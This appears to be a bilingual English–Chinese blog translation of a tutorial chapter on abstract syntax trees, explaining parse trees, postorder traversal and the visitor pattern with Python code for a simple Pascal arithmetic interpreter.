Let's Build A Simple Interpreter. Part 5. Let's Build A Simple Interpreter. Part 6. Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees Let's Build A Simple Interpreter. Part 8. Let's Build A Simple Interpreter. Part 9. Let's Build A Simple Interpreter. Part 10. Let's Build A Simple Interpreter. Part 11. Let's Build A Simple Interpreter. Part 12. Let's Build A Simple Interpreter. Part 13: Semantic Analysis Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler Let's Build A Simple Interpreter. Part 15. Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part-8/"},{"title":"[翻译与学习] Let’s Build A Simple Interpreter. Part7. Abstract Syntax Trees","content":"As I promised you last time, today I will talk about one of the central data structures that we’ll use throughout the rest of the series, so buckle up and let’s go. 正如我上次所承诺的那样，今天将讨论我们将在本系列的其余部分中使用的核心数据结构之一，所以系好安全带，我们出发吧。 Up until now, we had our interpreter and parser code mixed together and the interpreter would evaluate an expression as soon as the parser recognized a certain language construct like addition, subtraction, multiplication, or division. Such interpreters are called syntax-directed interpreters. They usually make a single pass over the input and are suitable for basic language applications. In order to analyze more complex Pascal programming language constructs, we need to build an intermediate representation (IR). Our parser will be responsible for building an IR and our interpreter will use it to interpret the input represented as the IR. 到目前为止，我们把解释器和解析器代码混合在一起，一旦解析器识别出某种语言结构，比如加、减、乘、除，解释器就会计算一个表达式。这样的解释器被称为语法导向解释器。它们通常只对输入进行一次传递，适用于基本的语言应用程序。为了分析更复杂的 Pascal 编程语言结构，我们需要构建一个中间表示(intermediate representation，IR)。解析器将负责构建一个 IR，然后解释器将使用它来解释 用IR表示的输入。 It turns out that a tree is a very suitable data structure for an IR. 事实证明，树是一种非常适合 IR 的数据结构。 Let’s quickly talk about tree terminology. 让我们快速讨论一下关于树的术语。 A tree is a data structure that consists of one or more nodes organized into a hierarchy. 树是一种数据结构，它由一个或多个节点组织成一个层次结构 The tree has one root, which is the top node. 树有一个顶部节点root All nodes except the root have a unique parent. 除root以外的所有节点都有一个唯一的父节点 The node labeled ***** in the picture below is a parent. Nodes labeled 2 and 7 are its children; children are ordered from left to right. 下图中标记为*的节点是父节点。标记为2和7的节点是它的子节点;子节点们按从左到右的顺序排列。 A node with no children is called a leaf node. 没有子节点的节点称为叶节点（leaf node）。 A node that has one or more children and that is not the root is called an interior node. 有一个或多个子节点且不是root节点的节点称为内部节点（interior node）。 The children can also be complete subtrees. In the picture below the left child (labeled *****) of the + node is a complete subtree with its own children. 子节点也可以是完整的子树。在下面的图片中，+节点的左子节点(标记为*)是一个完整的子树，它有自己的子节点。 In computer science we draw trees upside down starting with the root node at the top and branches growing downward. 在计算机科学中，我们倒过来画树，从顶部的root节点开始，树枝向下生长。 Here is a tree for the expression 2 * 7 + 3 with explanations: 下面是表达式2 * 7 + 3的一棵树，并附有解释: The IR we’ll use throughout the series is called an abstract-syntax tree (AST). But before we dig deeper into ASTs let’s talk about parse trees briefly. Though we’re not going to use parse trees for our interpreter and compiler, they can help you understand how your parser interpreted the input by visualizing the execution trace of the parser. We’ll also compare them with ASTs to see why ASTs are better suited for intermediate representation than parse trees. 我们将在整个系列中使用的 IR 称为抽象语法树(abstract-syntax tree，AST)。但是在我们更深入地研究 ASTs 之前，让我们先简要地讨论一下解析树（parse trees）。虽然我们不打算为解释器和编译器使用解析树，但是它们可以通过将解析器的执行轨迹可视化来帮助你来理解解析器是如何解释输入的。我们还将把它们与 ASTs 进行比较，看看为什么 AST 比解析树更适合中间表示。 So, what is a parse tree? A parse-tree (sometimes called a concrete syntax tree) is a tree that represents the syntactic structure of a language construct according to our grammar definition. It basically shows how your parser recognized the language construct or, in other words, it shows how the start symbol of your grammar derives a certain string in the programming language. 那么，什么是解析树？解析树（有时称为具体语法树——concrete syntax tree）是一棵树，这棵树根据grammar的定义表示语言结构的句法结构（syntactic structure）。它基本上显示了解析器如何识别语言结构，或者换句话说，它显示了grammar的起始符号如何在编程语言中派生某个字符串。 The call stack of the parser implicitly represents a parse tree and it’s automatically built in memory by your parser as it is trying to recognize a certain language construct. 解析器的调用堆栈隐式地表示一个解析树，当解析器试图识别某种语言结构时，它会自动构建在内存中。 Let’s take a look at a parse tree for the expression 2 * 7 + 3: 让我们看一下表达式2 * 7 + 3的解析树: In the picture above you can see that: 在上面的图片中你可以看到: The parse tree records a sequence of rules the parser applies to recognize the input. 解析树记录了解析器用于识别输入的一系列规则 The root of the parse tree is labeled with the grammar start symbol. 解析树的root用grammar起始符号标记 Each interior node represents a non-terminal, that is it represents a grammar rule application, like _expr _, term, or factor in our case. 每个内部节点代表一个非终结符，即它表示一个grammar规则应用，如在我们的例子中是expr、term或者factor。 Each leaf node represents a token. 每个叶节点代表一个token As I’ve already mentioned, we’re not going to manually construct parser trees and use them for our interpreter but parse trees can help you understand how the parser interpreted the input by visualizing the parser call sequence. 正如我已经提到的，我们不打算手动构造解析树并将它们用于解释器，但解析树可以通过将解析器调用序列可视化来帮助你理解解析器如何解释输入。 You can see how parse trees look like for different arithmetic expressions by trying out a small utility called genptdot.py that I quickly wrote to help you visualize them. To use the utility you first need to install Graphviz package and after you’ve run the following command, you can open the generated image file parsetree.png and see a parse tree for the expression you passed as a command line argument: 通过尝试一个名为 genptdot.py 的小工具程序，你可以看到不同算术表达式的解析树是什么样子的，我快速编写了这个工具程序来帮助你将它们可视化。要使用这个工具，你首先需要安装 Graphviz 包，在你运行下面的命令之后，你可以打开生成的图片文件 parsetree.png，然后看到一个和作为命令行参数传递的表达式对应的解析树于: $ python genptdot.py &quot;14 + 2 * 3 - 6 / 2&quot; &gt; \\ parsetree.dot &amp;&amp; dot -Tpng -o parsetree.png parsetree.dot Here is the generated image parsetree.png for the expression 14 + 2 * 3 - 6 / 2: 下面是为表达式14 + 2 * 3-6/2生成的图像 parsetree.png: Play with the utility a bit by passing it different arithmetic expressions and see what a parse tree looks like for a particular expression. 通过向该工具程序传递不同的算术表达式，了解特定表达式的解析树是什么样的。 Now, let’s talk about abstract-syntax trees (AST). This is the intermediate representation (IR) that we’ll heavily use throughout the rest of the series. It is one of the central data structures for our interpreter and future compiler projects. 现在，让我们讨论一下抽象语法树（AST）。这是中间表示(intermediate representation，IR) ，我们将在本系列的其余部分大量使用它。它是我们的解释器和未来编译器项目的核心数据结构之一。 Let’s start our discussion by taking a look at both the AST and the parse tree for the expression 2 * 7 + 3: 让我们先来看一下表达式2 * 7 + 3的 AST 和解析树: As you can see from the picture above, the AST captures the essence of the input while being smaller. 正如你从上面的图片中看到的，AST 捕获了输入的本质，同时也变得更小了。 Here are the main differences between ASTs and Parse trees: 以下是 ASTs 和 解析树之间的主要区别: ASTs uses operators/operations as root and interior nodes and it uses operands as their children. ASTs 使用操作符/操作作为根节点和内部节点，并使用操作数作为它们的子节点 ASTs do not use interior nodes to represent a grammar rule, unlike the parse tree does. 与解析树不同，ASTs不使用内部节点来表示grammar规则 ASTs don’t represent every detail from the real syntax (that’s why they’re called abstract) - no rule nodes and no parentheses, for example. ASTs并不代表真实syntax中的每一个细节（这就是它们被称为抽象的原因）——例如，没有规则节点和括号。 ASTs are dense compared to a parse tree for the same language construct. 与同一语言构造的解析树相比，ASTs是密集的 So, what is an abstract syntax tree? An abstract syntax tree (AST) is a tree that represents the abstract syntactic structure of a language construct where each interior node and the root node represents an operator, and the children of the node represent the operands of that operator. 那么，什么是抽象语法树？抽象语法树是一个树，它表示语言结构的抽象语法结构，其中每个内部节点和根节点代表一个操作符，这些节点的子节点代表该操作符的操作数。 I’ve already mentioned that ASTs are more compact than parse trees. Let’s take a look at an AST and a parse tree for the expression 7 + ((2 + 3)). You can see that the following AST is much smaller than the parse tree, but still captures the essence of the input: 我已经提到，ASTs 比解析树更紧凑。让我们看一下表达式7 + ((2 + 3))的 AST 和解析树。你可以看到下面的 AST 比解析树小得多，但仍然抓住了输入的本质: So far so good, but how do you encode operator precedence in an AST? In order to encode the operator precedence in AST, that is, to represent that “X happens before Y” you just need to put X lower in the tree than Y. And you’ve already seen that in the previous pictures. 到目前为止还不错，但是如何在 AST 中编码运算符优先级呢？为了在 AST 中编码运算符的优先级，也就是说，为了表示“ x 先于 y 发生”，你只需要在树中将 x 放在比 y 低的位置，你已经在前面的图片中看到了这一点。 Let’s take a look at some more examples. 让我们来看看更多的例子。 In the picture below, on the left, you can see an AST for the expression 2 * 7 + 3. Let’s change the precedence by putting 7 + 3 inside the parentheses. You can see, on the right, what an AST looks like for the modified expression 2 * (7 + 3): 在下面的图片中，在左边，你可以看到表达式2 * 7 + 3的 AST。让我们把7 + 3放在括号内来改变优先顺序。你可以看到，在右边，AST 对于修改后的表达式2 * (7 + 3)是什么样的: Here is an AST for the expression 1 + 2 + 3 + 4 + 5: 下面是表达式1 + 2 + 3 + 4 + 5的 AST: From the pictures above you can see that operators with higher precedence end up being lower in the tree. 从上面的图片中可以看到，优先级较高的操作符最终在树中的位置较低。 Okay, let’s write some code to implement different AST node types and modify our parser to generate an AST tree composed of those nodes. 好的，让我们编写一些代码来实现不同的 AST 节点类型，并修改我们的解析器以生成由这些节点组成的 AST 树。 First, we’ll create a base node class called AST that other classes will inherit from: 首先，我们将创建一个名为 AST 的基本节点类，其他类将从这个类继承: class AST(object): pass Not much there, actually. Recall that ASTs represent the operator-operand model. So far, we have four operators and integer operands. The operators are addition, subtraction, multiplication, and division. We could have created a separate class to represent each operator like AddNode, SubNode, MulNode, and DivNode, but instead we’re going to have only one BinOp class to represent all four binary operators (a binary operator is an operator that operates on two operands): 实际上，没有多少。回想一下，AST 表示操作符-操作数模型。到目前为止，我们有四个运算符和整数操作数。运算符是加法、减法、乘法和除法。我们本可以创建一个单独的类来表示每个操作符，比如 AddNode、 SubNode、 MulNode 和 DivNode，但是我们决定只写一个 BinOp 类来表示所有四个二元操作符（二元操作符是对两个操作数进行操作的操作符）: class BinOp(AST): def __init__(self, left, op, right): self.left = left self.token = self.op = op self.right = right The parameters to the constructor are left, op, and right, where left and right point correspondingly to the node of the left operand and to the node of the right operand. Op holds a token for the operator itself: Token(PLUS, ‘+’) for the plus operator, Token(MINUS, ‘-‘) for the minus operator, and so on. 构造函数的参数是left、 op 和right，其中left和right相应地指向左操作数的节点和右操作数的节点。Op 为运算符本身保存一个token：加号运算符的token(PLUS，‘ +’) ，减号运算符的token(MINUS，‘-’) ，等等。 To represent integers in our AST, we’ll define a class Num that will hold an INTEGER token and the token’s value: 为了在 AST 中表示整数，我们将定义一个类 Num，它将包含一个 INTEGER token和该token的值: class Num(AST): def __init__(self, token): self.token = token self.value = token.value As you’ve noticed, all nodes store the token used to create the node. This is mostly for convenience and it will come in handy in the future. 正如你所注意到的，所有节点都存储了用于创建节点的token（self.token）。这主要是为了方便，将来会派上用场。 Recall the AST for the expression 2 * 7 + 3. We’re going to manually create it in code for that expression: 回想表达式2 * 7 + 3的 AST。我们将用代码手动创建这个表达式: &gt;&gt;&gt; from spi import Token, MUL, PLUS, INTEGER, Num, BinOp &gt;&gt;&gt; &gt;&gt;&gt; mul_token = Token(MUL, '*') &gt;&gt;&gt; plus_token = Token(PLUS, '+') &gt;&gt;&gt; mul_node = BinOp( ... left=Num(Token(INTEGER, 2)), ... op=mul_token, ... right=Num(Token(INTEGER, 7)) ... ) &gt;&gt;&gt; add_node = BinOp( ... left=mul_node, ... op=plus_token, ... right=Num(Token(INTEGER, 3)) ... ) Here is how an AST will look with our new node classes defined. The picture below also follows the manual construction process above: 下图展示了定义了新的Node类后 AST 的样子。下图仍遵循上述人工建造过程: Here is our modified parser code that builds and returns an AST as a result of recognizing the input (an arithmetic expression): 下面是我们修改后的解析器代码，它在识别输入（算术表达式）后构建并返回 AST: class AST(object): pass class BinOp(AST): def __init__(self, left, op, right): self.left = left self.token = self.op = op self.right = right class Num(AST): def __init__(self, token): self.token = token self.value = token.value class Parser(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() # 返回的是Num类对象 def factor(self): &quot;&quot;&quot;factor : INTEGER | LPAREN expr RPAREN&quot;&quot;&quot; token = self.current_token if token.type == INTEGER: self.eat(INTEGER) return Num(token) elif token.type == LPAREN: self.eat(LPAREN) node = self.expr() self.eat(RPAREN) return node # 返回的是BinOp对象 def term(self): &quot;&quot;&quot;term : factor ((MUL | DIV) factor)*&quot;&quot;&quot; node = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) elif token.type == DIV: self.eat(DIV) node = BinOp(left=node, op=token, right=self.factor()) return node def expr(self): &quot;&quot;&quot; expr : term ((PLUS | MINUS) term)* term : factor ((MUL | DIV) factor)* factor : INTEGER | LPAREN expr RPAREN &quot;&quot;&quot; node = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) elif token.type == MINUS: self.eat(MINUS) node = BinOp(left=node, op=token, right=self.term()) return node def parse(self): return self.expr() Let’s go over the process of an AST construction for some arithmetic expressions. 让我们回顾一下一些算术表达式的 AST 构造过程。 If you look at the parser code above you can see that the way it builds nodes of an AST is that each BinOp node adopts the current value of the node variable as its left child and the result of a call to a term or factor as its right child, so it’s effectively pushing down nodes to the left and the tree for the expression 1 +2 + 3 + 4 + 5 below is a good example of that. Here is a visual representation how the parser gradually builds an AST for the expression 1 + 2 + 3 + 4 + 5: 如果你看看上面的解析器代码，你会发现它构建 AST 节点的方式是，每个 BinOp 节点采用node变量的当前值作为它的左子节点，调用一个term或factor的结果作为它的右子节点，所以它有效地将节点向左下推，下面表达式1 + 2 + 3 + 4 + 5的树就是一个很好的例子。下面是解析器如何为表达式1 + 2 + 3 + 4 + 5逐步构建 AST 的可视化表示: To help you visualize ASTs for different arithmetic expressions, I wrote a small utility that takes an arithmetic expression as its first argument and generates a DOT file that is then processed by the dot utility to actually draw an AST for you (dot is part of the Graphviz package that you need to install to run the dot command). Here is a command and a generated AST image for the expression 7 + 3 * (10 / (12 / (3 + 1) - 1)): 为了帮助你可视化不同算术表达式的 AST，我编写了一个小功能程序，它将算术表达式作为第一个参数，并生成一个 dot 文件，然后由 dot 功能程序处理该文件，以便实际为您绘制 AST (dot是Graphviz 包的一部分，需要安装它以运行 dot 命令 )。下面是表达式7 + 3 * (10/(12/(3 + 1)-1))的命令和生成的 AST 图: $ python genastdot.py &quot;7 + 3 * (10 / (12 / (3 + 1) - 1))&quot; &gt; \\ ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot It’s worth your while to write some arithmetic expressions, manually draw ASTs for the expressions, and then verify them by generating AST images for the same expressions with the genastdot.py tool. That will help you better understand how ASTs are constructed by the parser for different arithmetic expressions. 编写一些算术表达式是值得的，手动为表达式绘制 AST，然后使用 genastdot.py 工具为相同的表达式生成 AST 图像来验证它们。这将帮助您更好地理解解析器如何为不同的算术表达式构造 ast。 Okay, here is an AST for the expression 2 * 7 + 3: 好的，这是表达式2 * 7 + 3的 AST: How do you navigate the tree to properly evaluate the expression represented by that tree? You do that by using a postorder traversal - a special case of depth-first traversal - which starts at the root node and recursively visits the children of each node from left to right. The postorder traversal visits nodes as far away from the root as fast as it can. 如何在树中导航以正确计算该树表示的表达式？您可以通过使用后序遍历（一种深度优先遍历的特殊情况）来实现这一点，该遍历从根节点开始，并从左到右递归地遍历每个节点的子节点。后序遍历尽可能快地访问远离根的节点。 Here is a pseudo code for the postorder traversal where &lt;&gt; is a placeholder for actions like addition, subtraction, multiplication, or division for a BinOp node or a simpler action like returning the integer value of a Num node: 下面是后序遍历的伪代码，其中 &lt; &gt; 是一个占位符，用于对 BinOp 节点进行加法、减法、乘法或除法操作，或者一个更简单的操作，如返回 Num 节点的整数值: The reason we’re going to use a postorder traversal for our interpreter is that first, we need to evaluate interior nodes lower in the tree because they represent operators with higher precedence and second, we need to evaluate operands of an operator before applying the operator to those operands. In the picture below, you can see that with postorder traversal we first evaluate the expression 2 * 7 and only after that we evaluate 14 + 3, which gives us the correct result, 17: 我们使用后序遍历解释器的原因是，首先，我们需要计算树中较低的内部节点，因为它们表示具有较高优先级的运算符; 其次，我们需要计算运算符的操作数，然后再将运算符应用于这些操作数。在下面的图片中，你可以看到，通过后序遍历，我们首先计算表达式2 * 7，然后计算14 + 3，得到了正确的结果17: For the sake of completeness, I’ll mention that there are three types of depth-first traversal: preorder traversal, inorder traversal, and postorder traversal. The name of the traversal method comes from the place where you put actions in the visitation code: 为了完整起见，我将提到深度优先遍历有三种类型: 前序遍历、中序遍历和后序遍历。遍历方法的名称来源于访问代码中的操作: Sometimes you might have to execute certain actions at all those points (preorder, inorder, and postorder). You’ll see some examples of that in the source code repository for this article. 有时候，您可能必须在所有这些点上执行某些操作(前序遍历、中序遍历和后序遍历)。你可以在本文的源代码仓库中看到一些这方面的例子。 Okay, let’s write some code to visit and interpret the abstract syntax trees built by our parser, shall we? 好的，让我们编写一些代码来访问和解释解析器构建的抽象语法树，好吗？ Here is the source code that implements the Visitor pattern: 下面是实现Visitor pattern的源代码： ​ class NodeVisitor(object): def visit(self, node): method_name = 'visit_' + type(node).__name__ visitor = getattr(self, method_name, self.generic_visit) return visitor(node) def generic_visit(self, node): raise Exception('No visit_{} method'.format(type(node).__name__)) And here is the source code of our Interpreter class that inherits from the NodeVisitor class and implements different methods that have the form visit_NodeType, where NodeType is replaced with the node’s class name like BinOp, Num and so on: 下面是我们的 Interpreter 类的源代码，它继承了 _NodeVisitor _类，实现了不同的方法，具有 visit_NodeType 的形式，其中 NodeType 被节点的类名所替换，比如 BinOp、 Num 等: class Interpreter(NodeVisitor): def __init__(self, parser): self.parser = parser def visit_BinOp(self, node): if node.op.type == PLUS: return self.visit(node.left) + self.visit(node.right) elif node.op.type == MINUS: return self.visit(node.left) - self.visit(node.right) elif node.op.type == MUL: return self.visit(node.left) * self.visit(node.right) elif node.op.type == DIV: return self.visit(node.left) / self.visit(node.right) def visit_Num(self, node): return node.value There are two interesting things about the code that are worth mentioning here: First, the visitor code that manipulates AST nodes is decoupled from the AST nodes themselves. You can see that none of the AST node classes (BinOp and Num) provide any code to manipulate the data stored in those nodes. That logic is encapsulated in the Interpreter class that implements the NodeVisitor class. 这里值得一提的代码有两个有趣的地方：首先，操作 AST 节点的visitor代码与 AST 节点本身解耦。可以看到，AST 节点类（BinOp 和 Num）都没有提供任何代码来操作存储在这些节点中的数据。该逻辑封装在实现 NodeVisitor 类的 Interpreter 类中。 Second, instead of a giant if statement in the NodeVisitor’s visit method like this: 第二，不要像下面这样用巨大的 if 语句代替 NodeVisitor 的访问方式: def visit(node): node_type = type(node).__name__ if node_type == 'BinOp': return self.visit_BinOp(node) elif node_type == 'Num': return self.visit_Num(node) elif ... # ... or like this: 或者像这样: def visit(node): if isinstance(node, BinOp): return self.visit_BinOp(node) elif isinstance(node, Num): return self.visit_Num(node) elif ... the NodeVisitor’s visit method is very generic and dispatches calls to the appropriate method based on the node type passed to it. As I’ve mentioned before, in order to make use of it, our interpreter inherits from the NodeVisitor class and implements necessary methods. So if the type of a node passed to the visit method is BinOp, then the visit method will dispatch the call to the visit_BinOp method, and if the type of a node is Num, then the visit method will dispatch the call to the visit_Num method, and so on. NodeVisitor 的 visit 方法非常通用，它根据传递给它的节点类型将调用分派给相应的方法。正如我之前提到的，为了使用它，我们的解释器继承了 NodeVisitor 类并实现了必要的方法。因此，如果传递给 visit 方法的节点类型是 BinOp，那么 visit 方法将调用 visit_BinOp 方法，如果节点类型是 Num，那么 visit 方法将调用 visit_Num 方法，依此类推。 Spend some time studying this approach (standard Python module ast uses the same mechanism for node traversal) as we will be extending our interpreter with many new visit_NodeType methods in the future. 花一些时间研究这种方法(标准的 Python 模块 AST 使用相同的机制进行节点遍历) ，因为我们将在未来使用许多新的 visit_Nodetype 方法扩展我们的解释器。 The generic_visit method is a fallback that raises an exception to indicate that it encountered a node that the implementation class has no corresponding visit_NodeType method for. generic_visit 方法是一个fallback，它引发一个异常，以指示它遇到一个节点，但该节点的实现类没有对应的 visit_NodeType 方法。 Now, let’s manually build an AST for the expression 2 * 7 + 3 and pass it to our interpreter to see the visit method in action to evaluate the expression. Here is how you can do it from the Python shell: 现在，让我们为表达式2 * 7 + 3手动构建一个 AST，并将其传递给我们的解释器，以查看实际中的 visit 方法来计算表达式。下面是如何在 Python shell 中实现它的方法: &gt;&gt;&gt; from spi import Token, MUL, PLUS, INTEGER, Num, BinOp &gt;&gt;&gt; &gt;&gt;&gt; mul_token = Token(MUL, '*') &gt;&gt;&gt; plus_token = Token(PLUS, '+') &gt;&gt;&gt; mul_node = BinOp( ... left=Num(Token(INTEGER, 2)), ... op=mul_token, ... right=Num(Token(INTEGER, 7)) ... ) &gt;&gt;&gt; add_node = BinOp( ... left=mul_node, ... op=plus_token, ... right=Num(Token(INTEGER, 3)) ... ) &gt;&gt;&gt; from spi import Interpreter &gt;&gt;&gt; inter = Interpreter(None) &gt;&gt;&gt; inter.visit(add_node) 17 As you can see, I passed the root of the expression tree to the visit method and that triggered traversal of the tree by dispatching calls to the correct methods of the Interpreter class(visit_BinOp and visit_Num) and generating the result. 如您所见，我将表达式树的根传递给了 visit 方法，通过调用 Interpreter 类的正确方法(visit_BinOp 和 visit_Num)并生成结果，该方法触发了树的遍历。 Okay, here is the complete code of our new interpreter for your convenience: 好了，为了方便起见，下面是我们新解释器的完整代码: &quot;&quot;&quot; SPI - Simple Pascal Interpreter &quot;&quot;&quot; ############################################################################### # # # LEXER # # # ############################################################################### # Token types # # EOF (end-of-file) token is used to indicate that # there is no more input left for lexical analysis INTEGER, PLUS, MINUS, MUL, DIV, LPAREN, RPAREN, EOF = ( 'INTEGER', 'PLUS', 'MINUS', 'MUL', 'DIV', '(', ')', 'EOF' ) class Token(object): def __init__(self, type, value): self.type = type self.value = value def __str__(self): &quot;&quot;&quot;String representation of the class instance. Examples: Token(INTEGER, 3) Token(PLUS, '+') Token(MUL, '*') &quot;&quot;&quot; return 'Token({type}, {value})'.format( type=self.type, value=repr(self.value) ) def __repr__(self): return self.__str__() class Lexer(object): def __init__(self, text): # client string input, e.g. &quot;4 + 2 * 3 - 6 / 2&quot; self.text = text # self.pos is an index into self.text self.pos = 0 self.current_char = self.text[self.pos] def error(self): raise Exception('Invalid character') def advance(self): &quot;&quot;&quot;Advance the `pos` pointer and set the `current_char` variable.&quot;&quot;&quot; self.pos += 1 if self.pos &gt; len(self.text) - 1: self.current_char = None # Indicates end of input else: self.current_char = self.text[self.pos] def skip_whitespace(self): while self.current_char is not None and self.current_char.isspace(): self.advance() def integer(self): &quot;&quot;&quot;Return a (multidigit) integer consumed from the input.&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isdigit(): result += self.current_char self.advance() return int(result) def get_next_token(self): &quot;&quot;&quot;Lexical analyzer (also known as scanner or tokenizer) This method is responsible for breaking a sentence apart into tokens. One token at a time. &quot;&quot;&quot; while self.current_char is not None: if self.current_char.isspace(): self.skip_whitespace() continue if self.current_char.isdigit(): return Token(INTEGER, self.integer()) if self.current_char == '+': self.advance() return Token(PLUS, '+') if self.current_char == '-': self.advance() return Token(MINUS, '-') if self.current_char == '*': self.advance() return Token(MUL, '*') if self.current_char == '/': self.advance() return Token(DIV, '/') if self.current_char == '(': self.advance() return Token(LPAREN, '(') if self.current_char == ')': self.advance() return Token(RPAREN, ')') self.error() return Token(EOF, None) ############################################################################### # # # PARSER # # # ############################################################################### class AST(object): pass class BinOp(AST): def __init__(self, left, op, right): self.left = left self.token = self.op = op self.right = right class Num(AST): def __init__(self, token): self.token = token self.value = token.value class Parser(object): def __init__(self, lexer): self.lexer = lexer # set current token to the first token taken from the input self.current_token = self.lexer.get_next_token() def error(self): raise Exception('Invalid syntax') def eat(self, token_type): # compare the current token type with the passed token # type and if they match then &quot;eat&quot; the current token # and assign the next token to the self.current_token, # otherwise raise an exception. if self.current_token.type == token_type: self.current_token = self.lexer.get_next_token() else: self.error() def factor(self): &quot;&quot;&quot;factor : INTEGER | LPAREN expr RPAREN&quot;&quot;&quot; token = self.current_token if token.type == INTEGER: self.eat(INTEGER) return Num(token) elif token.type == LPAREN: self.eat(LPAREN) node = self.expr() self.eat(RPAREN) return node def term(self): &quot;&quot;&quot;term : factor ((MUL | DIV) factor)*&quot;&quot;&quot; node = self.factor() while self.current_token.type in (MUL, DIV): token = self.current_token if token.type == MUL: self.eat(MUL) elif token.type == DIV: self.eat(DIV) node = BinOp(left=node, op=token, right=self.factor()) return node def expr(self): &quot;&quot;&quot; expr : term ((PLUS | MINUS) term)* term : factor ((MUL | DIV) factor)* factor : INTEGER | LPAREN expr RPAREN &quot;&quot;&quot; node = self.term() while self.current_token.type in (PLUS, MINUS): token = self.current_token if token.type == PLUS: self.eat(PLUS) elif token.type == MINUS: self.eat(MINUS) node = BinOp(left=node, op=token, right=self.term()) return node def parse(self): return self.expr() ############################################################################### # # # INTERPRETER # # # ############################################################################### class NodeVisitor(object): def visit(self, node): method_name = 'visit_' + type(node).__name__ visitor = getattr(self, method_name, self.generic_visit) return visitor(node) def generic_visit(self, node): raise Exception('No visit_{} method'.format(type(node).__name__)) class Interpreter(NodeVisitor): def __init__(self, parser): self.parser = parser def visit_BinOp(self, node): if node.op.type == PLUS: return self.visit(node.left) + self.visit(node.right) elif node.op.type == MINUS: return self.visit(node.left) - self.visit(node.right) elif node.op.type == MUL: return self.visit(node.left) * self.visit(node.right) elif node.op.type == DIV: return self.visit(node.left) // self.visit(node.right) def visit_Num(self, node): return node.value def interpret(self): tree = self.parser.parse() return self.visit(tree) def main(): while True: try: text = input('spi&gt; ') except EOFError: break if not text: continue lexer = Lexer(text) parser = Parser(lexer) interpreter = Interpreter(parser) result = interpreter.interpret() print(result) if __name__ == '__main__': main() Save the above code into the spi.py file or download it directly from GitHub. Try it out and see for yourself that your new tree-based interpreter properly evaluates arithmetic expressions. 将上面的代码保存到 spi.py 文件中，或者直接从 GitHub 下载。试一试，看看你的新的基于树的解释器能否正确地计算算术表达式。 Here is a sample session: 下面是一个例子: $ python spi.py spi&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) 22 spi&gt; 7 + 3 * (10 / (12 / (3 + 1) - 1)) / (2 + 3) - 5 - 3 + (8) 10 spi&gt; 7 + (((3 + 2))) 12 Today you’ve learned about parse trees, ASTs, how to construct ASTs and how to traverse them to interpret the input represented by those ASTs. You’ve also modified the parser and the interpreter and split them apart. The current interface between the lexer, parser, and the interpreter now looks like this: 今天，你已经学习了解析树、 ASTs、如何构造 ASTs 以及如何遍历它们以解释这些 ASTs 所表示的输入。你还修改了解析器和解释器，并将它们拆分开来。现在 lexer、 parser 和解释器之间的接口如下所示: You can read that as “The parser gets tokens from the lexer and then returns the generated AST for the interpreter to traverse and interpret the input.” 你可以将其理解为“parser从 lexer 获取token，然后返回生成的 AST，以便解释器遍历和解释输入”。 That’s it for today, but before wrapping up I’d like to talk briefly about recursive-descent parsers, namely just give them a definition because I promised last time to talk about them in more detail. So here you go: a recursive-descent parser is a top-down parser that uses a set of recursive procedures to process the input. Top-down reflects the fact that the parser begins by constructing the top node of the parse tree and then gradually constructs lower nodes. 今天就到这里，但是在结束之前，我想简要地谈谈递归下降解析器，也就是给它们一个定义，因为我上次承诺要更详细地讨论它们。因此，你可以这样做：递归下降解析器是一个自顶向下的解析器，它使用一组递归过程来处理输入。自顶向下反映了这样一个事实，即解析器从构造解析树的顶部节点开始，然后逐渐构造较低的节点。 And now it’s time for exercises 😃 现在是练习的时间了:) Write a translator (hint: node visitor) that takes as input an arithmetic expression and prints it out in postfix notation, also known as Reverse Polish Notation (RPN). For example, if the input to the translator is the expression (5 + 3) * 12 / 3 than the output should be 5 3 + 12 * 3 /. See the answer here but try to solve it first on your own. 编写一个转换器(提示:节点访问器)，将算术表达式作为输入，并以后缀表示法输出，也称为反向波兰表示法(RPN)。例如，如果输入到转换器的表达式是(5 + 3)* 12 / 3，那么输出就应该是5 3 + 12 * 3 /。在这里看到答案，但试着先自己解决它。 Write a translator (node visitor) that takes as input an arithmetic expression and prints it out in LISP style notation, that is 2 + 3 would become (+ 2 3) and (2 + 3 * 5) would become (+ 2 (* 3 5)). You can find the answer here but again try to solve it first before looking at the provided solution. 编写一个转换器(节点访问者)，它接受一个算术表达式作为输入，并以LISP风格的表示法输出它，即2 + 3将变成(+ 2,3)，(2 + 3 * 5)将变成(+ 2(* 3 5))。你可以在这里找到答案，但还是试着先解决它，然后再看提供的解决方案。 In the next article, we’ll add assignment and unary operators to our growing Pascal interpreter. Until then, have fun and see you soon. 在下一篇文章中，我们将为不断增长的 Pascal 解释器添加赋值和一元运算符。在那之前，玩得开心点，很快就能见到你。 P.S. I’ve also provided a Rust implementation of the interpreter that you can find on GitHub. This is a way for me to learn Rust so keep in mind that the code might not be “idiomatic” yet. Comments and suggestions as to how to make the code better are always welcome. 另外，我还提供了一个在 GitHub 上可以找到的解释器的 Rust 实现。这是我学习 Rust 的一种方法，所以请记住，代码可能还不是“惯用的”。关于如何使代码更好的评论和建议总是受欢迎的。 Here is a list of books I recommend that will help you in your study of interpreters and compilers: 下面是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) 